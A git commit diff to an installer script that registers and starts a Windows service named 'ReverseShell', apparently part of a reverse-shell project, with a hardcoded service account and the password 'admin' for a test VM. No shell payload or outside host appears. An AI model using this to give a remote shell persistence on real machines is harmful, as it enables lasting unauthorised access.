6c8027b12c0c99ea0d0c572a5461816dddb68f6b
Daniel Eidlin <daniel.eidlin@gmail.com>
2020-04-15 09:44:09 -0700

    Remove redundant lines

--- service_installer.py
+++ service_installer.py
@@ -6,16 +6,12 @@ def main():
     # Change directory to 'Desktop'.
     os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop"))
     os.chdir("Reverse-Shell")
-    cmd = "python service.py install"
-    subprocess.call(cmd, shell=True)
-    cmd = "python service.py update"
-    subprocess.call(cmd, shell=True)
-    cmd = "sc config ReverseShell start=auto"
+    cmd = "python service.py --startup delayed install"
     subprocess.call(cmd, shell=True)
     # This command is only needed in my windows server 2016 VM.
     cmd = r"sc config ReverseShell obj= WINDEV1911EVAL\User password= admin type= own"
     subprocess.call(cmd, shell=True)
-    cmd = "net start ReverseShell"
+    cmd = "python service.py start"
     subprocess.call(cmd, shell=True)
 
 
